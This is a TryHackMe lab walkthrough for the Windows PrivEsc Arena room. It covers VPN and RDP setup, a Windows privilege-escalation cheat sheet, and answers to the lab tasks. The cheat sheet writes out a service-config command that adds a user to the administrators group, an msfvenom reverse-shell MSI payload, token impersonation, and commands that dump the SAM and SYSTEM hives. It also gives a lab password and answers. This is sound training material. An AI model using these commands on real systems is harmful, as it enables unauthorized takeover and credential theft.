# TryHackMe - Connect to VPN & Access Lab Machine (Windows PrivEsc Areana / Lab Steps)

> Use these steps only in authorized labs (TryHackMe). They show how to download and use the OpenVPN config, confirm your interfaces, start the lab VM from the website, and SSH into the VM.

---

## 1. Download OpenVPN configuration (TryHackMe)

1. Login to TryHackMe.  
2. Go to **Manage your account → Access → VPN** (or **VPN settings**).  
3. Under **Access via OpenVPN / Machines**, select a VPN server and **Download** the `.ovpn` configuration file.  
4. Save the downloaded file (usually in `~/Downloads`).

---

## 2. Prepare on your Kali / Linux machine

### Change to downloads directory and list file

```bash
cd ~/Downloads
ls -lh *.ovpn                 # confirm the filename, e.g. thm-<user>.ovpn
```

Expected output (example):
```bash
-rw-r--r-- 1 user user 12K Aug 13 12:34 thm-config.ovpn
```

### Check current network interfaces

```bash
ip a
```

Expected output: 

```bash
1: lo: <LOOPBACK> ...
2: wlan0: <BROADCAST,MULTICAST> ...
3: eth0: ...
```

---
## 3. Connect to TryHackMe VPN
### Run OpenVPN with sudo and the downloaded config:

```bash
sudo openvpn filename.ovpn
```

- Enter your sudo password when prompted.
- Keep this terminal open while VPN is connected.

Successful connection shows lines like:

```bash
Initialization Sequence Completed
...
/sbin/ip addr add dev tun0 <vpn-ip>/xx
```

### Verify VPN interface in another terminal
Open a new terminal tab/window and run:

```bash
ip a
```

Expected output:

```bash
# new interface
tun0: <POINTOPOINT,MULTICAST> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    inet 10.10.14.5/32 scope global tun0
```

`tun0` with an IP indicates the VPN tunnel is active.

---

## 4. Confirm connection on TryHackMe website

- Refresh the TryHackMe VPN page or the machine/access panel.
- The website should show **"Connected"** for your VPN session and allow you to **Join** or **Start** the machine.

---

## 5. Start the lab machine and get target IP

- In the lab room (e.g., "Windows PrivEsc Arena"), click **Start Machine** (or **Deploy**).
- The lab will show a **target IP** for SSH or services (visible in the web lab panel or instructions).

---

## 6. Connect to the Windows Machine (RDP)
```bash
xfreerdp /u:<username> /p:<password> /v:<IP> /cert:ignore
```

---

## 7. Windows PrivEsc Techniques (Cheat Sheet)

###  Unquoted Service Path

Find services with unquoted paths:
```bash
wmic service get name,displayname,pathname,startmode | findstr /i " "
```
If path =  
`C:\Program Files\Something Service\Binary.exe`  
→ You can place `Binary.exe` earlier in the path.

---

### Weak Service Permissions

Check permissions:
```bash
accesschk64.exe -uwcqv <username> *
```

Modify vulnerable service:
```bash
sc.exe stop VulnService
sc.exe config VulnService binPath= "C:\Windows\System32\cmd.exe /c net localgroup administrators user /add"
sc.exe start VulnService
```

---

### AlwaysInstallElevated

Check both keys:
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

Exploit with MSI payload:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > evil.msi

```

Install as SYSTEM:
```bash
msiexec /quiet /qn /i evil.msi
```

---

### DLL Hijacking

Identify missing DLLs:

Use ProcMon (GUI) or test launch.

Place malicious DLL:
```bash
C:\Program Files\VulnDLL\wmvcore.dll
```

---

### Scheduled Task Abuse

List tasks:
```bash
schtasks /query /fo LIST /v
```

Find writable program executed by task.

---

### Token Impersonation (PrintSpoofer)

Example:
```bash
PrintSpoofer.exe -i -c cmd
```

---

### Stored Credentials

List stored credentials:
```bash
cmdkey /list
```

Use them:
```bash
runas /savecred /user:admin cmd.exe
```

---

### Dumping Password Hashes (SAM + SYSTEM)
```bash
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
```

---
---

## TASK 1 — Connect to the Machine

### Question:

_No question — informational task only._
### Steps:

- Connect to the Windows machine using RDP.
    
### Steps (with commands + solution):
```bash
xfreerdp /u:user /p:password321 /w:1000 /h:650 /v:10.10.X.x
```

### Answer:

_No answer required._

---
## TASK 2 — Autorun Registry PrivEsc

### Question:
What is the name of the program configured to run at startup that you can modify for privilege escalation?
### Steps:
- Open Autoruns tool.
- Navigate to the **Logon** tab.
- Identify startup programs.
- Check permissions on suspicious entries.
- Find a writable executable.

Open Autoruns:
```bash
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
```

Check Logon entries and find:
```bash
My Program → C:\Program Files\Autorun Program\program.exe
```

Check permissions:
```bash
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```
The directory is writable by all users.

Answer:
```bash
program.exe
```

---
